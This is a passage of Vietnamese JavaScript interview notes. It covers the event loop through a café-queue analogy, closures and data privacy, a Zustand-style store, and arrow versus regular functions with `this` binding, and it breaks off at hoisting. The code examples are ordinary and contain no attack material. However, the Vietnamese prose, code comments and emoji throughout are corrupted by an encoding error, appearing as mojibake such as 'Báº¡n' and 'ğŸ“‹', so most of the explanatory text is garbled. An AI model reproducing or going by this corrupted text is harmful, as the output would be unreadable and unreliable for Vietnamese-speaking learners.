- **Báº¡n** = JavaScript Engine (chá»‰ cÃ³ 1 ngÆ°á»i, lÃ m single-threaded)
- **Quáº§y pha cháº¿** = Call Stack (chá»‰ lÃ m Ä‘Æ°á»£c 1 viá»‡c táº¡i 1 thá»i Ä‘iá»ƒm)
- **Danh sÃ¡ch chá» VIP** = Microtask Queue (Æ°u tiÃªn cao - khÃ¡ch quen, khÃ¡ch VIP)
- **Danh sÃ¡ch chá» thÆ°á»ng** = Macrotask Queue (Æ°u tiÃªn tháº¥p hÆ¡n - khÃ¡ch má»›i)
- **Báº¡n kiá»ƒm tra** = Event Loop (liÃªn tá»¥c check xem cÃ³ viá»‡c gÃ¬ cáº§n lÃ m khÃ´ng)

---

**ğŸ“‹ QUY TRÃŒNH LÃ€M VIá»†C:**

**Buá»•i sÃ¡ng, quÃ¡n má»›i má»Ÿ cá»­a:**

1. **KhÃ¡ch A vÃ o** â†’ gá»i "CÃ  phÃª Ä‘en nÃ³ng" (code Ä‘á»“ng bá»™)
   - Báº¡n: "OK, pha ngay!" 
   - â†’ Báº¡n pha xong, Ä‘Æ°a cho khÃ¡ch A
   - â†’ KhÃ¡ch A nháº­n vÃ  Ä‘i

2. **KhÃ¡ch B vÃ o** â†’ gá»i "CÃ  phÃª phin" (setTimeout - máº¥t 5 phÃºt)
   - Báº¡n: "OK, cÃ  phÃª phin pháº£i Ä‘á»£i 5 phÃºt nhÃ©"
   - â†’ Báº¡n Ä‘á»ƒ mÃ¡y pha tá»± Ä‘á»™ng (Web API)
   - â†’ Ghi tÃªn KhÃ¡ch B vÃ o **Danh sÃ¡ch chá» thÆ°á»ng**
   - â†’ **KHÃ”NG Ä‘á»©ng Ä‘á»£i**, lÃ m viá»‡c khÃ¡c tiáº¿p

3. **KhÃ¡ch C vÃ o** â†’ gá»i "NÆ°á»›c cam váº¯t" (code Ä‘á»“ng bá»™)
   - Báº¡n: "OK, váº¯t ngay!"
   - â†’ Báº¡n váº¯t xong, Ä‘Æ°a cho khÃ¡ch C
   - â†’ KhÃ¡ch C nháº­n vÃ  Ä‘i

4. **KhÃ¡ch D vÃ o** â†’ gá»i "BÃ¡nh mÃ¬" vÃ  há»©a sáº½ tip (Promise - Microtask)
   - Báº¡n: "OK, khÃ¡ch tip thÃ¬ Æ°u tiÃªn cao!"
   - â†’ Ghi tÃªn KhÃ¡ch D vÃ o **Danh sÃ¡ch chá» VIP**
   - â†’ LÃ m viá»‡c khÃ¡c tiáº¿p

5. **KhÃ¡ch E vÃ o** â†’ gá»i "TrÃ  Ä‘Ã¡" (code Ä‘á»“ng bá»™)
   - Báº¡n: "OK, pha ngay!"
   - â†’ Báº¡n pha xong, Ä‘Æ°a cho khÃ¡ch E

---

**â° SAU ÄÃ“ (Event Loop báº¯t Ä‘áº§u hoáº¡t Ä‘á»™ng):**

Báº¡n check xem:

**â‘  Quáº§y pha cháº¿ cÃ³ trá»‘ng khÃ´ng?**
- âœ… Trá»‘ng rá»“i (Call Stack empty)

**â‘¡ CÃ³ khÃ¡ch VIP chá» khÃ´ng? (Microtask Queue)**
- âœ… CÃ³! KhÃ¡ch D (bÃ¡nh mÃ¬ - khÃ¡ch tip)
- â†’ Báº¡n phá»¥c vá»¥ KhÃ¡ch D trÆ°á»›c (Priority cao!)
- â†’ KhÃ¡ch D nháº­n bÃ¡nh mÃ¬, Ä‘i

**â‘¢ Váº«n cÃ²n khÃ¡ch VIP ná»¯a khÃ´ng?**
- âŒ KhÃ´ng (Microtask Queue empty)

**â‘£ CÃ³ khÃ¡ch thÆ°á»ng chá» khÃ´ng? (Macrotask Queue)**
- âœ… CÃ³! KhÃ¡ch B (cÃ  phÃª phin Ä‘Ã£ pha xong sau 5 phÃºt)
- â†’ Báº¡n Ä‘Æ°a cho KhÃ¡ch B
- â†’ KhÃ¡ch B nháº­n, Ä‘i

**â‘¤ Quay láº¡i bÆ°á»›c â‘ ** (láº·p láº¡i mÃ£i - Event Loop)

---

**ğŸ¬ VÃ Dá»¤ Cá»¤ THá»‚ Vá»šI CODE:**

```javascript
// KhÃ¡ch A: Code Ä‘á»“ng bá»™
console.log('ğŸ‘¤ KhÃ¡ch A: CÃ  phÃª Ä‘en nÃ³ng');
// â†’ Báº¡n: Pha ngay! â˜• (thá»±c hiá»‡n ngay láº­p tá»©c)

// KhÃ¡ch B: setTimeout (Macrotask - chá» 0ms nhÆ°ng vÃ o hÃ ng chá» thÆ°á»ng)
setTimeout(() => {
  console.log('ğŸ‘¤ KhÃ¡ch B: CÃ  phÃª phin (Ä‘Ã£ chá»)');
}, 0);
// â†’ Báº¡n: Ghi vÃ o danh sÃ¡ch chá» thÆ°á»ng ğŸ“‹

// KhÃ¡ch C: Code Ä‘á»“ng bá»™
console.log('ğŸ‘¤ KhÃ¡ch C: NÆ°á»›c cam váº¯t');
// â†’ Báº¡n: Váº¯t ngay! ğŸŠ

// KhÃ¡ch D: Promise (Microtask - khÃ¡ch VIP)
Promise.resolve().then(() => {
  console.log('ğŸ‘¤ KhÃ¡ch D: BÃ¡nh mÃ¬ (khÃ¡ch tip - VIP)');
});
// â†’ Báº¡n: Ghi vÃ o danh sÃ¡ch VIP â­

// KhÃ¡ch E: Code Ä‘á»“ng bá»™
console.log('ğŸ‘¤ KhÃ¡ch E: TrÃ  Ä‘Ã¡');
// â†’ Báº¡n: Pha ngay! ğŸµ

// ===== Káº¾T QUáº¢ OUTPUT =====
// ğŸ‘¤ KhÃ¡ch A: CÃ  phÃª Ä‘en nÃ³ng     â† Äá»“ng bá»™ (ngay láº­p tá»©c)
// ğŸ‘¤ KhÃ¡ch C: NÆ°á»›c cam váº¯t         â† Äá»“ng bá»™ (ngay láº­p tá»©c)
// ğŸ‘¤ KhÃ¡ch E: TrÃ  Ä‘Ã¡               â† Äá»“ng bá»™ (ngay láº­p tá»©c)
// ğŸ‘¤ KhÃ¡ch D: BÃ¡nh mÃ¬ (VIP)        â† Microtask (Æ°u tiÃªn cao)
// ğŸ‘¤ KhÃ¡ch B: CÃ  phÃª phin          â† Macrotask (Æ°u tiÃªn tháº¥p)
```

---

**ğŸ¤” Táº I SAO Láº I NHÆ¯ Váº¬Y?**

**CÃ¢u há»i 1:** Táº¡i sao KhÃ¡ch B (setTimeout 0ms) khÃ´ng Ä‘Æ°á»£c phá»¥c vá»¥ ngay?
- **Tráº£ lá»i:** VÃ¬ KhÃ¡ch B vÃ o **Danh sÃ¡ch chá» thÆ°á»ng** (Macrotask). DÃ¹ chá» 0ms, nhÆ°ng pháº£i Ä‘á»£i háº¿t viá»‡c Ä‘ang lÃ m + khÃ¡ch VIP má»›i Ä‘áº¿n lÆ°á»£t.

**CÃ¢u há»i 2:** Táº¡i sao KhÃ¡ch D (Promise) Ä‘Æ°á»£c phá»¥c vá»¥ trÆ°á»›c KhÃ¡ch B?
- **Tráº£ lá»i:** VÃ¬ KhÃ¡ch D lÃ  **KhÃ¡ch VIP** (Microtask), cÃ³ Æ°u tiÃªn cao hÆ¡n KhÃ¡ch thÆ°á»ng (Macrotask).

**CÃ¢u há»i 3:** Náº¿u cÃ³ 100 khÃ¡ch VIP liÃªn tá»¥c, khÃ¡ch thÆ°á»ng cÃ³ Ä‘Æ°á»£c phá»¥c vá»¥ khÃ´ng?
- **Tráº£ lá»i:** KHÃ”NG! ÄÃ¢y gá»i lÃ  **"Microtask Starvation"** (ÄÃ³i khÃ¡ch thÆ°á»ng). Báº¡n cá»© phá»¥c vá»¥ khÃ¡ch VIP mÃ£i, khÃ¡ch thÆ°á»ng chá» mÃ£i khÃ´ng tá»›i lÆ°á»£t.

---

**ğŸ• VÃ Dá»¤ THá»°C Táº¾: Äáº¶T PIZZA**

```javascript
console.log('ğŸ  TÃ´i Ä‘ang á»Ÿ nhÃ ');

// Äáº·t pizza (setTimeout - Macrotask)
setTimeout(() => {
  console.log('ğŸ• Pizza giao Ä‘áº¿n, tÃ´i má»Ÿ cá»­a nháº­n');
}, 3000); // 3 giÃ¢y sau

console.log('ğŸ“º TÃ´i xem TV trong lÃºc Ä‘á»£i');

// Há»©a vá»›i báº£n thÃ¢n (Promise - Microtask)
Promise.resolve().then(() => {
  console.log('ğŸ’­ Nháº¯c báº£n thÃ¢n: Nhá»› láº¥y tiá»n tip cho shipper');
});

console.log('ğŸ¿ TÃ´i Äƒn bá»ng ngÃ´');

// ===== OUTPUT =====
// ğŸ  TÃ´i Ä‘ang á»Ÿ nhÃ                       â† Ngay láº­p tá»©c
// ğŸ“º TÃ´i xem TV trong lÃºc Ä‘á»£i            â† Ngay láº­p tá»©c
// ğŸ¿ TÃ´i Äƒn bá»ng ngÃ´                     â† Ngay láº­p tá»©c
// ğŸ’­ Nháº¯c báº£n thÃ¢n: Nhá»› láº¥y tiá»n tip     â† Microtask (Æ°u tiÃªn cao)
// (chá» 3 giÃ¢y...)
// ğŸ• Pizza giao Ä‘áº¿n, tÃ´i má»Ÿ cá»­a nháº­n     â† Macrotask (sau cÃ¹ng)
```

**Giáº£i thÃ­ch:**
1. Báº¡n lÃ m háº¿t viá»‡c Ä‘ang lÃ m (xem TV, Äƒn bá»ng ngÃ´)
2. Nhá»› láº¥y tiá»n tip (Microtask - viá»‡c quan trá»ng)
3. Cuá»‘i cÃ¹ng má»›i nháº­n pizza (Macrotask - Ä‘Ã£ háº¹n trÆ°á»›c 3 giÃ¢y)

---

**ğŸš— VÃ Dá»¤: ÄI SIÃŠU THá»Š**

```javascript
console.log('ğŸš— TÃ´i lÃ¡i xe Ä‘áº¿n siÃªu thá»‹');

// Äáº·t háº¹n giá» bÃ¡o thá»©c xe (setTimeout)
setTimeout(() => {
  console.log('â° BÃ¡o thá»©c: ÄÃ£ 1 giá», vá» nhÃ  thÃ´i!');
}, 3600000); // 1 giá»

console.log('ğŸ›’ TÃ´i láº¥y giá» vÃ  Ä‘i mua sáº¯m');

// Nhá»› viá»‡c quan trá»ng (Promise)
Promise.resolve().then(() => {
  console.log('ğŸ’¡ á»’ nhá»› rá»“i! Pháº£i mua sá»¯a cho con');
});

console.log('ğŸ¥¬ TÃ´i mua rau cá»§');

// ===== OUTPUT =====
// ğŸš— TÃ´i lÃ¡i xe Ä‘áº¿n siÃªu thá»‹             â† Ngay láº­p tá»©c
// ğŸ›’ TÃ´i láº¥y giá» vÃ  Ä‘i mua sáº¯m           â† Ngay láº­p tá»©c
// ğŸ¥¬ TÃ´i mua rau cá»§                      â† Ngay láº­p tá»©c
// ğŸ’¡ á»’ nhá»› rá»“i! Pháº£i mua sá»¯a cho con     â† Microtask (nhá»› ngay)
// (chá» 1 giá»...)
// â° BÃ¡o thá»©c: ÄÃ£ 1 giá», vá» nhÃ  thÃ´i!    â† Macrotask (háº¹n giá»)
```

---

**âš ï¸ TÃŒNH HUá»NG Xáº¤U: KHÃCH VIP VÃ” Háº N (Microtask Starvation)**

```javascript
console.log('ğŸª QuÃ¡n má»Ÿ cá»­a');

// KhÃ¡ch thÆ°á»ng Ä‘áº·t hÃ ng
setTimeout(() => {
  console.log('ğŸ˜¢ KhÃ¡ch thÆ°á»ng: TÃ´i chá» mÃ£i khÃ´ng tá»›i lÆ°á»£t!');
}, 0);

// KhÃ¡ch VIP liÃªn tá»¥c (VÃ” Háº N!)
function khachVIPLienTuc() {
  Promise.resolve().then(() => {
    console.log('â­ KhÃ¡ch VIP: Phá»¥c vá»¥ tÃ´i Ä‘i!');
    khachVIPLienTuc(); // Táº¡o thÃªm khÃ¡ch VIP má»›i!
  });
}

khachVIPLienTuc();

// ===== Káº¾T QUáº¢ =====
// ğŸª QuÃ¡n má»Ÿ cá»­a
// â­ KhÃ¡ch VIP: Phá»¥c vá»¥ tÃ´i Ä‘i!
// â­ KhÃ¡ch VIP: Phá»¥c vá»¥ tÃ´i Ä‘i!
// â­ KhÃ¡ch VIP: Phá»¥c vá»¥ tÃ´i Ä‘i!
// ... (vÃ´ háº¡n láº§n)
// ğŸ˜¢ KhÃ¡ch thÆ°á»ng: KHÃ”NG BAO GIá»œ Ä‘Æ°á»£c phá»¥c vá»¥!

// âš ï¸ Lá»–I: Báº¡n chá»‰ phá»¥c vá»¥ khÃ¡ch VIP mÃ£i, khÃ¡ch thÆ°á»ng Ä‘Ã³i cháº¿t!
```

---

**âœ… NGUYÃŠN Táº®C VÃ€NG (KhÃ´ng Technical):**

1. **LÃ m viá»‡c Ä‘ang lÃ m trÆ°á»›c** (Code Ä‘á»“ng bá»™)
2. **Æ¯u tiÃªn khÃ¡ch VIP** (Promise, Microtask)
3. **Sau Ä‘Ã³ má»›i Ä‘áº¿n khÃ¡ch thÆ°á»ng** (setTimeout, Macrotask)
4. **KhÃ´ng táº¡o khÃ¡ch VIP vÃ´ háº¡n** (trÃ¡nh Microtask Starvation)
5. **LuÃ´n check láº¡i** (Event Loop láº·p mÃ£i)

---

**ğŸ¯ TÃ“M Táº®T Báº°NG 1 CÃ‚U:**

> **"LÃ m háº¿t viá»‡c Ä‘ang lÃ m, Æ°u tiÃªn khÃ¡ch VIP, rá»“i má»›i phá»¥c vá»¥ khÃ¡ch thÆ°á»ng, vÃ  cá»© tháº¿ láº·p láº¡i mÃ£i."**

---

**ğŸ“ SO SÃNH Vá»šI Äá»œI Sá»NG THá»°C:**

| Thuáº­t Ngá»¯ Technical | VÃ­ Dá»¥ Äá»i ThÆ°á»ng |
|---------------------|------------------|
| Call Stack | Viá»‡c Ä‘ang lÃ m (pha cÃ  phÃª, váº¯t cam) |
| Microtask Queue | Danh sÃ¡ch khÃ¡ch VIP (Æ°u tiÃªn cao) |
| Macrotask Queue | Danh sÃ¡ch khÃ¡ch thÆ°á»ng (chá» lÃ¢u hÆ¡n) |
| Event Loop | Báº¡n liÃªn tá»¥c check xem cÃ²n viá»‡c gÃ¬ chÆ°a |
| Web APIs | MÃ¡y pha tá»± Ä‘á»™ng, Ä‘á»“ng há»“ háº¹n giá» |
| Single Thread | Chá»‰ cÃ³ 1 báº¡n lÃ m viá»‡c, khÃ´ng cÃ³ nhÃ¢n viÃªn phá»¥ |
| Non-blocking | KhÃ´ng Ä‘á»©ng Ä‘á»£i, lÃ m viá»‡c khÃ¡c trong lÃºc chá» |
| Async | Äáº·t háº¹n giá», chá» giao hÃ ng |

---

**ğŸ“ BÃ€I Há»ŒC:**

- JavaScript chá»‰ cÃ³ **1 ngÆ°á»i lÃ m viá»‡c** (single-threaded)
- NhÆ°ng **ráº¥t thÃ´ng minh**: khÃ´ng Ä‘á»£i, lÃ m nhiá»u viá»‡c cÃ¹ng lÃºc nhá» **Æ°u tiÃªn** vÃ  **háº¹n giá»**
- **KhÃ¡ch VIP** (Microtask) luÃ´n Ä‘Æ°á»£c Æ°u tiÃªn hÆ¡n **khÃ¡ch thÆ°á»ng** (Macrotask)
- Pháº£i **cáº©n tháº­n** khÃ´ng táº¡o khÃ¡ch VIP vÃ´ háº¡n, náº¿u khÃ´ng khÃ¡ch thÆ°á»ng Ä‘Ã³i cháº¿t!

**ğŸ’¡ Nhá»› cÃ´ng thá»©c:**
```
LÃ m xong viá»‡c Ä‘ang lÃ m
â†’ Phá»¥c vá»¥ Háº¾T khÃ¡ch VIP
â†’ Phá»¥c vá»¥ Má»˜T khÃ¡ch thÆ°á»ng
â†’ Láº·p láº¡i
```

---
</details>


## **Pháº§n 4: Functions & Context**

<details>
<summary><span style="font-size:1.25em;font-weight:bold;">ğŸ” Q14: Closure & Data Privacy</span></summary>


**âš¡ Quick Summary:**
> Closure = function nhá»› Ä‘Æ°á»£c biáº¿n tá»« outer scope ngay cáº£ khi outer function Ä‘Ã£ return. DÃ¹ng Ä‘á»ƒ private data

**ğŸ’¡ Ghi Nhá»›:**
- ğŸ”¥ **Definition**: Function + Lexical Environment (biáº¿n xung quanh nÃ³)
- ğŸ¯ **Use Cases**: Private variables, Factory functions, Callbacks, Event handlers
- âš¡ **Memory**: Closure giá»¯ reference â†’ biáº¿n khÃ´ng bá»‹ GC â†’ cáº©n tháº­n memory leak
- ğŸ“¦ **Module Pattern**: IIFE + Closure = private state

**Tráº£ lá»i:**

- **Closure**: Function cÃ³ thá»ƒ access variables tá»« outer scope ngay cáº£ khi outer function Ä‘Ã£ return
- **Data Privacy**: Sá»­ dá»¥ng closure Ä‘á»ƒ táº¡o private variables
- **Hoáº¡t Ä‘á»™ng**: Inner function giá»¯ reference Ä‘áº¿n outer scope
- **Æ¯u Ä‘iá»ƒm**: Encapsulation, data privacy, module pattern
- **NhÆ°á»£c Ä‘iá»ƒm**: CÃ³ thá»ƒ gÃ¢y memory leaks náº¿u khÃ´ng quáº£n lÃ½ tá»‘t

**Code Example:**

```typescript
// Basic Closure
function outerFunction(x: number) {
  // Outer scope variable
  let outerVariable = x;

  // Inner function (closure)
  function innerFunction(y: number): number {
    return outerVariable + y; // Access outer variable
  }

  return innerFunction;
}

const closure = outerFunction(10);
console.log(closure(5)); // 15
// outerFunction Ä‘Ã£ return nhÆ°ng innerFunction váº«n access Ä‘Æ°á»£c outerVariable

// Data Privacy vá»›i Closure
function createCounter(): { increment: () => number; getCount: () => number } {
  let count = 0; // Private variable

  return {
    increment(): number {
      return ++count; // Access private variable
    },
    getCount(): number {
      return count; // Access private variable
    },
  };
}

const counter = createCounter();
console.log(counter.increment()); // 1
console.log(counter.increment()); // 2
console.log(counter.getCount()); // 2
// console.log(counter.count);     // âŒ Error: count is private

// Module Pattern
const userModule = (() => {
  let users: string[] = []; // Private data

  return {
    addUser(name: string): void {
      users.push(name);
    },
    getUsers(): string[] {
      return [...users]; // Return copy
    },
    getUserCount(): number {
      return users.length;
    },
  };
})();

userModule.addUser('John');
userModule.addUser('Jane');
console.log(userModule.getUsers()); // ["John", "Jane"]
console.log(userModule.getUserCount()); // 2
// users array is private
```

**Best Practices:**

- Sá»­ dá»¥ng closure cho data privacy
- Sá»­ dá»¥ng module pattern
- TrÃ¡nh memory leaks
- Sá»­ dá»¥ng TypeScript cho type safety

**Mistakes:**

```typescript
// âŒ Sai: KhÃ´ng hiá»ƒu closure scope
for (var i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 100); // 3, 3, 3
}

// âœ… ÄÃºng: Sá»­ dá»¥ng closure Ä‘Ãºng cÃ¡ch
for (let i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 100); // 0, 1, 2
}

// Hoáº·c sá»­ dá»¥ng closure vá»›i var
for (var i = 0; i < 3; i++) {
  ((index: number) => {
    setTimeout(() => console.log(index), 100); // 0, 1, 2
  })(i);
}
```

#### VÃ¬ sao Redux/Zustand dÃ¹ng closure Ä‘á»ƒ lÆ°u tráº¡ng thÃ¡i?

- **Encapsulation (Ä‘Ã³ng gÃ³i state an toÃ n)**: State sá»‘ng trong pháº¡m vi tá»« vá»±ng (lexical scope) cá»§a store, khÃ´ng thá»ƒ bá»‹ thay Ä‘á»•i trá»±c tiáº¿p tá»« bÃªn ngoÃ i náº¿u khÃ´ng Ä‘i qua API cÃ´ng khai (getState, setState, subscribe). TrÃ¡nh lá»™ biáº¿n toÃ n cá»¥c vÃ  háº¡n cháº¿ Ä‘á»™t biáº¿n ngoÃ i Ã½ muá»‘n.
- **API nhá» gá»n, khÃ´ng cáº§n lá»›p/phá»¥ trá»£**: Má»™t factory function táº¡o store tráº£ vá» cÃ¡c hÃ m thao tÃ¡c; closure giá»¯ state vÃ  danh sÃ¡ch listeners. KhÃ´ng báº¯t buá»™c dÃ¹ng class/this, giáº£m rá»§i ro context.
- **Hiá»‡u nÄƒng dá»± Ä‘oÃ¡n Ä‘Æ°á»£c**: KhÃ´ng cáº§n Proxy hay getter/setter; cáº­p nháº­t state lÃ  thao tÃ¡c thuáº§n (immutable/mutable tÃ¹y chiáº¿n lÆ°á»£c), thÃ´ng bÃ¡o qua danh sÃ¡ch subscribers trong cÃ¹ng closure â†’ chi phÃ­ tháº¥p, dá»… tá»‘i Æ°u.
- **Kháº£ nÄƒng multiple store Ä‘á»™c láº­p**: Má»—i láº§n gá»i factory táº¡o má»™t scope má»›i vá»›i state riÃªng, khÃ´ng rÃ² rá»‰ chÃ©o. Dá»… táº¡o nhiá»u store, test theo tá»«ng instance.

VÃ­ dá»¥ mÃ´ phá»ng (Ä‘Æ¡n giáº£n hÃ³a theo phong cÃ¡ch Zustand):

```ts
type Listener<T> = (state: T, prev: T) => void;

function createStore<T>(
  initializer: (
    set: (p: Partial<T> | ((s: T) => Partial<T>)) => void,
    get: () => T
  ) => T
) {
  let state: T;
  const listeners = new Set<Listener<T>>();

  const get = () => state;
  const set = (patch: Partial<T> | ((s: T) => Partial<T>)) => {
    const prev = state;
    const next =
      typeof patch === 'function'
        ? (patch as (s: T) => Partial<T>)(prev)
        : patch;
    state = { ...prev, ...next };
    listeners.forEach((l) => l(state, prev));
  };

  state = initializer(set, get);

  return {
    getState: get,
    setState: set,
    subscribe(listener: Listener<T>) {
      listeners.add(listener);
      return () => listeners.delete(listener);
    },
  };
}
```

So vá»›i lá»±a chá»n khÃ¡c:

- **Class + this**: Cáº§n rÃ ng buá»™c ngá»¯ cáº£nh, dá»… lá»—i khi truyá»n phÆ°Æ¡ng thá»©c; khÃ³ tree-shake hÆ¡n náº¿u khÃ´ng cáº©n tháº­n.
- **Proxy**: Tiá»‡n reactive nhÆ°ng tá»‘n chi phÃ­ báº«y (traps), phá»©c táº¡p debug, khÃ´ng cáº§n thiáº¿t khi chá»‰ cáº§n pub/sub Ä‘Æ¡n giáº£n.
- **Global singleton**: Dá»… rÃ² rá»‰ state giá»¯a tests/SSR, khÃ³ táº¡o nhiá»u instance Ä‘á»™c láº­p.

</details>

<details>
<summary><span style="font-size:1.25em;font-weight:bold;">â¡ï¸ Q15: Arrow vs Regular Functions & this Binding (call, apply, bind)</span></summary>


**âš¡ Quick Summary:**
> Arrow function = lexical `this` (tá»« outer scope), khÃ´ng cÃ³ arguments, khÃ´ng dÃ¹ng new. `this` trong JS = context object, dÃ¹ng call/apply/bind Ä‘á»ƒ set `this` manually.

**ğŸ’¡ Ghi Nhá»›:**
- ğŸ¯ **Arrow**: `() => {}` - this tá»« outer scope, khÃ´ng cÃ³ arguments/constructor
- ğŸ“Œ **Regular**: `function(){}` - this runtime, cÃ³ arguments, hoisted
- ğŸ“ **call**: `fn.call(thisArg, arg1, arg2)` - invoke ngay vá»›i args riÃªng láº»
- ğŸ“‹ **apply**: `fn.apply(thisArg, [args])` - invoke ngay vá»›i array
- ğŸ”— **bind**: `fn.bind(thisArg)` - return function má»›i vá»›i this cá»‘ Ä‘á»‹nh


### **1. Arrow vs Regular Functions - Sá»± KhÃ¡c Biá»‡t Quan Trá»ng**

#### **1.1. Syntax & Declaration**

```typescript
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// SYNTAX - CÃº phÃ¡p
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

// Regular Function
function regularFunction(name: string): string {
  return `Hello ${name}`;
}

// Arrow Function - ngáº¯n gá»n hÆ¡n
const arrowFunction = (name: string): string => `Hello ${name}`;

// Arrow vá»›i 1 parameter - bá» Ä‘Æ°á»£c ()
const single = name => `Hello ${name}`;

// Arrow return object - pháº£i bá»c trong ()
const getUser = (id: number) => ({ id, name: 'John' });
// KhÃ´ng cÃ³ () sáº½ bá»‹ nháº§m vá»›i block { }

// Arrow multiline - cáº§n return
const calculate = (a: number, b: number) => {
  const sum = a + b;
  const product = a * b;
  return { sum, product };
};
```

#### **1.2. this Binding - KhÃ¡c Biá»‡t QUAN TRá»ŒNG Nháº¥t**

```typescript
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// THIS BINDING - Äiá»ƒm khÃ¡c biá»‡t QUAN TRá»ŒNG nháº¥t
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

class Person {
  name: string = 'John';

  // âŒ Regular function - this lÃ  Äá»˜NG (dynamic binding)
  // this phá»¥ thuá»™c vÃ o CÃI GÃŒ gá»i function (runtime)
  regularMethod(): void {
    setTimeout(function () {
      console.log(this.name); 
      // âŒ undefined!
      // VÃ¬ function Ä‘Æ°á»£c gá»i bá»Ÿi setTimeout â†’ this = window/global
    }, 100);
  }

  // âœ… Arrow function - this lÃ  TÄ¨NH (lexical binding)
  // this Ä‘Æ°á»£c "káº¿ thá»«a" tá»« outer scope (Person instance)
  arrowMethod(): void {
    setTimeout(() => {
      console.log(this.name); 
      // âœ… "John"!
      // Arrow function KHÃ”NG cÃ³ this riÃªng â†’ láº¥y this tá»« Person
    }, 100);
  }

  // ğŸ”§ CÃ¡ch fix cho regular function
  regularMethodFixed(): void {
    const self = this; // LÆ°u this vÃ o biáº¿n
    setTimeout(function () {
      console.log(self.name); // âœ… "John" - dÃ¹ng biáº¿n self
    }, 100);
  }

  regularMethodBind(): void {
    setTimeout(function () {
      console.log(this.name); // âœ… "John" - bind this
    }.bind(this), 100);
  }
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// THIS trong Object Methods
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

const user = {
  name: 'Alice',
  
  // âŒ SAI: Arrow function trong object method
  greetArrow: () => {
    console.log(this.name); 
    // âŒ undefined!
    // Arrow function láº¥y this tá»« OUTER SCOPE (window/global)
    // KhÃ´ng pháº£i object `user`!
  },
  
  // âœ… ÄÃšNG: Regular function
  greetRegular() {
    console.log(this.name); 
    // âœ… "Alice"
    // Regular function: this = object gá»i method (user)
  },
  
  // âœ… Use case ÄÃšNG cho arrow function
  registerEvents() {
    document.addEventListener('click', () => {
      console.log(this.name); 
      // âœ… "Alice"
      // Arrow láº¥y this tá»« registerEvents â†’ this = user
    });
    
    // âŒ Regular function sáº½ sai
    document.addEventListener('click', function() {
      console.log(this.name); 
      // âŒ undefined
      // this = document (object gá»i callback)
    });
  }
};
```

**ğŸ’¡ Quy táº¯c this:**
```typescript
// Regular function: this phá»¥ thuá»™c vÃ o CÃI GÃŒ gá»i function
obj.method()      // this = obj
fn()              // this = window/global
new Fn()          // this = instance má»›i
fn.call(obj)      // this = obj

// Arrow function: this = this cá»§a OUTER SCOPE (nÆ¡i function Ä‘Æ°á»£c Ä‘á»‹nh nghÄ©a)
// KhÃ´ng quan tÃ¢m CÃI GÃŒ gá»i function!
```

#### **1.3. arguments Object**

```typescript
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// ARGUMENTS OBJECT
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

// Regular function - CÃ“ arguments object
function regularWithArgs(a: number, b: number): void {
  console.log(arguments); 
  // âœ… Arguments { '0': 10, '1': 20, '2': 30 }
  console.log(arguments.length); // 3
  console.log(arguments[2]); // 30 - extra argument
}

regularWithArgs(10, 20, 30);

// Arrow function - KHÃ”NG cÃ³ arguments
const arrowWithArgs = (a: number, b: number): void => {
  // console.log(arguments);  
  // âŒ ReferenceError: arguments is not defined
};

// âœ… Giáº£i phÃ¡p: DÃ¹ng rest parameters
const arrowWithRest = (...args: number[]): void => {
  console.log(args); // âœ… [10, 20, 30]
  console.log(args.length); // 3
};

arrowWithRest(10, 20, 30);
```

#### **1.4. Constructor & new**

```typescript
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// CONSTRUCTOR - Chá»‰ regular function cÃ³ thá»ƒ lÃ m constructor
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

// âœ… Regular function - cÃ³ thá»ƒ dÃ¹ng new
function RegularConstructor(name: string) {
  this.name = name;
}

const instance1 = new RegularConstructor('John');
console.log(instance1.name); // "John" âœ…

// âŒ Arrow function - KHÃ”NG thá»ƒ dÃ¹ng new
const ArrowConstructor = (name: string) => {
  this.name = name;
};

// const instance2 = new ArrowConstructor('John');
// âŒ TypeError: ArrowConstructor is not a constructor
```

#### **1.5. Hoisting**

```typescript
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// HOISTING
